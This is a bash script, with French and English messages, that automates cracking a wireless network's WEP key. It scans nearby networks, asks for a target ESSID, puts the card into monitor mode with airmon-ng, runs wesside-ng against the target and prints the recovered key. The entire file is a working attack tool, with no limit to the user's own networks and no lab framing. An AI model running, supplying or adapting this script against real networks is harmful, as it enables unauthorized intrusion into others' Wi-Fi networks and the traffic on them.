#!/usr/bin/env bash

set -o nounset
set -o errexit

wifiIF=$(iwconfig 2>/dev/null | awk '/IEEE 802.11/{print$1}')

test $wifiIF && {
	echo "=> wifiIF = <$wifiIF>"

	tmpFile=$(mktemp)
	test $# = 0 && {
		echo "=> Voici les liste des reseaux:"
		sudo iwlist $wifiIF scan > $tmpFile
		egrep "Address:|Channel:|Encryption key:|ESSID:|IE: .*WPA" $tmpFile

		echo -n "=> Saisir le nom du reseau ou le ESSID: "
		read essID
	} || {
		essID=$1
		sudo iwlist $wifiIF scan > $tmpFile
	}

	channelID=$(grep -B4 $essID $tmpFile | awk -F: '/Channel:/{print$2}')
	rm $tmpFile
	test $channelID || {
		echo "=> ERROR: The channelID could not be found." >&2
		exit 1
	}

#	type airmon-ng >/dev/null || {
#		wget -qO/dev/null www.google.com && sudo apt-get install -qqy aircrack-ng || exit
#	}

	type airmon-ng >/dev/null || {
		echo "=> ERROR: The package <aircrack-ng> is not installed." >&2
		exit 1
	}

	echo "=> channelID = <$channelID>"
	#monitoringIF=$(sudo airmon-ng | egrep -v "Interface|$wifiIF|^$" | cut -f1)
	monitoringIF=$(sudo airmon-ng start $wifiIF $channelID | awk '/monitor mode enabled on/{print $NF}' | tr -d ")")

	trap "sudo airmon-ng stop $monitoringIF" INT

	echo "=> monitoringIF = <$monitoringIF>"

	echo "=> Do you want to start the procedure ? [y/n]"
	read -n1 answer
	echo $answer | egrep -iq "y|o" && sudo wesside-ng -i $monitoringIF
	#iwconfig 2>/dev/null

	#sudo -b airodump-ng $monitoringIF

	echo
	test -f key.log && {
		echo -n "=> The key is: " && tr -d : < key.log
		echo
		rm -f key.log
	}

	sudo airmon-ng | grep -q $monitoringIF && sudo airmon-ng stop $monitoringIF
	echo "=> Fin du script <$0>."
} || {
	echo "=> ERROR: No wifi interface could be found." >&2
	exit 1
}
